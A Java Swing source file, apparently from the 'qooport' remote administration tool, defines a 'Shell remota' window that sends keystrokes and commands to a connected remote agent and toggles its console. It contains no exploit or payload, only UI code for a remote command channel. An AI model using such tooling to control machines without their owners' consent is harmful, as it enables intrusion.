package qooport.modulos.pc.terminal;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.FlowLayout;
import java.awt.Font;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import qooport.asociado.Asociado;
import qooport.modulos.pc.terminal.caret.FancyCaret;
import qooport.utilidades.GuiUtil;
import qooport.utilidades.Protocolo;
import qooport.utilidades.Util;

public class Terminal extends JFrame {

    private Asociado agente;
    public JTextArea salida;
    private JTextField comando;
    private JCheckBox chkMostrarCaracter = new JCheckBox("Mostrar caracter?");

    public Terminal(Asociado servidor) {
        initComponents();
        this.setIconImage(Util.cargarIcono16("/resources/cmd.png").getImage());
        this.agente = servidor;
    }

    private void initComponents() {
//        jTabbedPane1 = new JTabbedPane();
        JPanel panel = new JPanel();

        final JPanel panelInferior = new JPanel();
        panelInferior.setVisible(false);

        JScrollPane jScrollPane1;
        jScrollPane1 = new JScrollPane();
        JButton btnEnviar = new JButton();
        btnEnviar.setIcon(Util.cargarIcono16("/resources/exe.png"));
        btnEnviar.setVisible(true);
        btnEnviar.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                Terminal.this.btnEnviarComando(evt);
            }
        });
        JButton btnActivar = new JButton();
        btnActivar.setIcon(Util.cargarIcono16("/resources/switch_on.png"));
        btnActivar.setToolTipText("Activa la consola");
        btnActivar.setVisible(true);
        btnActivar.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                Terminal.this.btnActivar(evt);
            }
        });
        JButton btnDesactivar = new JButton();
        btnDesactivar.setIcon(Util.cargarIcono16("/resources/switch_off.png"));
        btnDesactivar.setToolTipText("Desactiva la consola. Termina comando actualmente en ejecución");
        btnDesactivar.setVisible(true);
        btnDesactivar.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                Terminal.this.btnDesactivar(evt);
            }
        });

        JButton btnActivar_2 = new JButton();
        btnActivar_2.setIcon(Util.cargarIcono16("/resources/switch_on.png"));
        btnActivar_2.setToolTipText("Activa el ingreso de comando completo");
        btnActivar_2.setVisible(true);
        btnActivar_2.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                panelInferior.setVisible(true);
            }
        });

        JButton btnDesactivar_2 = new JButton();
        btnDesactivar_2.setIcon(Util.cargarIcono16("/resources/switch_off.png"));
        btnDesactivar_2.setToolTipText("Desactiva el ingreso de comando entero");
        btnDesactivar_2.setVisible(true);
        btnDesactivar_2.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                panelInferior.setVisible(false);
            }
        });

        chkMostrarCaracter.setToolTipText("Si esta activada muestra el caracter presionado.");

        salida = new JTextArea("");
        salida.setBackground(Color.BLACK);
        salida.setForeground(Color.LIGHT_GRAY);
        salida.setCaret(new FancyCaret());
        salida.setCaretColor(Color.WHITE);
        salida.setColumns(40);
        salida.setRows(25);
        salida.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 11));
//        this.salida.append("\n$>");

        salida.addKeyListener(new KeyAdapter() {
            @Override
            public void keyPressed(KeyEvent e) {
                super.keyPressed(e); //To change body of generated methods, choose Tools | Templates.                
            }

            @Override
            public void keyReleased(KeyEvent e) {
                super.keyReleased(e); //To change body of generated methods, choose Tools | Templates.
            }

            @Override
            public void keyTyped(KeyEvent e) {
                agente.ejecutarComandoConsola(e.getKeyChar());
                //super.keyTyped(e); //To change body of generated methods, choose Tools | Templates.
                if (!chkMostrarCaracter.isSelected()) {
                    e.consume();
                }
//
//                if (e.getKeyChar() == '\t') {
//                    e.consume();
//                }
            }
        });

        comando = new JTextField();

        comando.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                Terminal.this.btnEnviarComando(evt);
            }
        });
        jScrollPane1.setViewportView(this.salida);
        JPanel panelSuperior = new JPanel();
        panelSuperior.setLayout(new FlowLayout());
        panelSuperior.add(chkMostrarCaracter);
        panelSuperior.add(GuiUtil.crearJLabel("    "));
        panelSuperior.add(btnActivar);
        panelSuperior.add(btnDesactivar);
        panelSuperior.add(GuiUtil.crearJLabel("    "));
        panelSuperior.add(btnActivar_2);
        panelSuperior.add(btnDesactivar_2);

        panelInferior.setLayout(new BorderLayout());
        panelInferior.add(GuiUtil.crearJLabel("O Ingresar comando :", "Permite escribir el comando antes de enviarlo a ejecutar"), BorderLayout.WEST);
        panelInferior.add(comando, BorderLayout.CENTER);
        panelInferior.add(btnEnviar, BorderLayout.EAST);

        panel.setLayout(new BorderLayout());
        panel.add(jScrollPane1, BorderLayout.CENTER);
        panel.add(panelInferior, BorderLayout.SOUTH);
        panel.add(panelSuperior, BorderLayout.NORTH);
        //TABS
//        this.jTabbedPane1.addTab("Shell remota", Util.cargarIcono16("/resources/cmd.png"), panel);
        this.setLayout(new BorderLayout());
//        this.add(jTabbedPane1, BorderLayout.CENTER);
        this.add(panel, BorderLayout.CENTER);
        this.setSize(600, 450);
        this.setResizable(true);
        this.setVisible(true);
        this.setTitle("Shell remota");
        this.setIconImage(Util.cargarIcono16("/resources/cmd.png").getImage());
        pack();
    }

    private void btnActivar(ActionEvent evt) {
        agente.enviarComando(Protocolo.CONSOLA_ACTIVAR);
    }

    private void btnDesactivar(ActionEvent evt) {
        agente.enviarComando(Protocolo.CONSOLA_DESACTIVAR);
    }

    private void btnEnviarComando(ActionEvent evt) {
        //this.salida.append(comando.getText());
        this.salida.append("$>" + comando.getText());
        this.salida.append("\n");
        agente.ejecutarComandoConsola(comando.getText());
        salida.setCaretPosition(salida.getDocument().getLength());
        vaciarcomando();
    }

    public void vaciarcomando() {
        comando.setText("");
    }
}
